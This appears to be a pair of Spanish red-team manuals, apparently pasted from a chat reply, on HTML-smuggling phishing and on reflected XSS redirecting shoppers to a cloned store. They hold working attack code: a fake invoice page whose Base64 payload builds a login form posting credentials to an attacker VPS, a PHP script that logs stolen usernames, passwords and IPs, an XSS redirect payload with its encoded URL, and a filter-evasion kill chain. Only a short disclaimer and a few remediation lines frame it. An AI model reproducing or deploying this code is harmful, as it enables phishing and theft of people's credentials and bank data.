
```markdown
# Técnica de Evasión: HTML Smuggling & Sandbox Bypass

## 🕵️ Resumen de la Técnica
Esta técnica utiliza **HTML Smuggling** para evadir filtros de correo electrónico (SEG) y Sandboxes corporativos. En lugar de adjuntar un archivo malicioso que sería detectado por el antivirus perimetral, se envía un código HTML benigno que **"construye" el payload malicioso localmente** en el navegador de la víctima utilizando JavaScript y Base64.

---

## ⛓️ Kill Chain (Flujo de Ataque)
1.  **Vector de Entrega:** Correo legítimo (Gmail) con ingeniería social (Factura Urgente).
2.  **Evasión de URL:** Uso de **Códigos QR** y enlaces a **Google Drive** (dominio confiable) para evitar listas negras.
3.  **Descarga Anidada:** PDF en Drive -> ZIP en Drive -> Archivo `.html`.
4.  **Ejecución Local:** El archivo HTML se abre en el navegador. No hay tráfico de red sospechoso porque el archivo se genera en la memoria del cliente.
5.  **Exfiltración:** Formulario HTML puro que envía los datos (POST) a un VPS controlado (C2).

---

## 💻 Código de la Prueba de Concepto (PoC)

El siguiente código muestra cómo se utiliza JavaScript para decodificar un payload en Base64 y reescribir el documento (`document.write`) en tiempo real.

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <title>Factura Electrónica - Visualización Segura</title>
</head>
<body>
    <script>
        // ---------------------------------------------------------
        // TÉCNICA DE SMUGGLING:
        // El contenido malicioso (Formulario clonado) está cifrado en Base64.
        // Los filtros de seguridad solo ven una cadena de texto sin sentido.
        // ---------------------------------------------------------
        
        // Payload codificado (Simulación de Login Clonado)
        // Este string base64 se decodifica en un formulario HTML al ejecutarse.
        var payload_b64 = "PGZvcm0gYWN0aW9uPSJodHRwOi8vMTA4LjE0Mi5YWC5YWC9wb3N0LnBocCIgbWV0aG9kPSJQT1NUIj4KICA8aDE+U2VzaW9uIENhZHVjYWRhPC9oMT4KICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlciIgcGxhY2Vob2xkZXI9IlVzdWFyaW8iPgogIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzcyIgcGxhY2Vob2xkZXI9IkNvbnRyYXNlw7FhIj4KICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+SW5ncmVzYXI8L2J1dHRvbj4KPC9mb3JtPg==";

        // Decodificación dinámica en el cliente (Client-Side Assembly)
        // atob() decodifica Base64 a String
        var contenido_real = atob(payload_b64);
        
        // Inyección en el DOM
        document.open();
        document.write(contenido_real);
        document.close();
        
        // NOTA: Al ejecutarse en local (file:// o blob:), 
        // muchas soluciones de seguridad no inspeccionan el tráfico generado.
    </script>
</body>
</html>

```

## ⚙️ Infraestructura de Recepción (C2)

El atacante levanta un servidor ligero (Apache/Nginx) con un script PHP para capturar las credenciales enviadas por el formulario inyectado.

**Script de Captura (`post.php`):**

```php
<?php
// Recepción de credenciales en texto plano
$file = 'capturas.txt';

// Verificamos si llegan datos por POST
if(isset($_POST['user']) && isset($_POST['pass'])) {
    $data = "User: " . $_POST['user'] . " | Pass: " . $_POST['pass'] . " | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    
    // Guardado persistente en el servidor atacante
    file_put_contents($file, $data, FILE_APPEND);
}

// Redirección final para no levantar sospechas (a la web real)
header('Location: [https://sitio-legitimo.com](https://sitio-legitimo.com)');
exit();
?>

```

---

> **Disclaimer:** Esta documentación demuestra técnicas avanzadas de evasión para pruebas de Red Team. El uso de HTML Smuggling contra objetivos sin autorización es ilegal.

```

---

### ARCHIVO 2: XSS Redirect (El caso del Retailer/Gallo)
*Este ponlo separado, porque es un ataque web diferente.*

**Ubicación:** Crea un archivo nuevo en `Manuales de seguridad ofensiva/XSS-Open-Redirect-Attack.md`
**Contenido:** (Copia todo el bloque negro).

```markdown
# Cadena de Ataque: XSS Reflejado + Clonación de Sitio

## 🎯 Objetivo de la Auditoría
Demostrar cómo un atacante puede aprovechar vulnerabilidades en un sitio web legítimo (Cross-Site Scripting o Open Redirect) para redirigir tráfico a un sitio de phishing idéntico.

**Target:** Plataforma de E-Commerce Minorista (Anonimizado: "Retailer-X").

---

## ⚔️ Flujo del Ataque

### 1. Reconocimiento de Vulnerabilidad
Se detectó que el buscador interno del sitio web de "Retailer-X" era vulnerable a **Reflected XSS**. El sitio no sanitizaba correctamente los parámetros de entrada en la URL.

* **URL Vulnerable:** `https://retailer-x.com/search?q=<script>...`

### 2. Armado del Enlace Malicioso (The Hook)
En lugar de enviar un link extraño (`mitienda-fake.com`), se envía un link que **empieza con el dominio legítimo** de la víctima. Esto engaña a los usuarios y a los filtros de seguridad básicos.

**Payload Inyectado:**
```javascript
<script>window.location="[https://retailer-x-ofertas.online/producto-iphone15.html](https://retailer-x-ofertas.online/producto-iphone15.html)"</script>

```

**URL Final (Codificada):**
La víctima ve `retailer-x.com` al inicio, lo que genera confianza inmediata.
`https://retailer-x.com/search?q=%3Cscript%3Ewindow.location%3D%22https%3A%2F%2Fretailer-x-ofertas.online%2F...`

### 3. Infraestructura de Phishing (Clonación)

* **Dominio:** Se registró un dominio *Typosquatting* (`.online`) muy similar al original.
* **Clonación:** Se utilizó `HTTrack` o clonación manual de HTML/CSS para replicar exactamente la página de un producto de alto valor.
* **Flujo de Compra Falso:**
1. `producto.html` (Idéntico al original).
2. `carrito.html` (Simulación de compra).
3. `pago.html` (Formulario malicioso que apunta al VPS del atacante).



### 4. Ejecución

1. La víctima hace clic en el enlace que parece legítimo (`retailer-x.com`).
2. El sitio legítimo ejecuta el XSS y redirige automáticamente al sitio clonado.
3. La víctima "compra" el producto e introduce sus datos bancarios.
4. Los datos viajan al VPS (`post.php`) y se guardan en texto plano.

---

## 🛡️ Impacto y Remediación

Esta técnica es altamente efectiva porque la víctima inicia la navegación en un dominio en el que confía.

**Recomendaciones para el Cliente:**

* Implementar **Content Security Policy (CSP)** para prevenir la ejecución de scripts no autorizados.
* Sanitizar todas las entradas de usuario en la barra de búsqueda (Escaping).
* Corregir vulnerabilidades de Open Redirect.

```

```
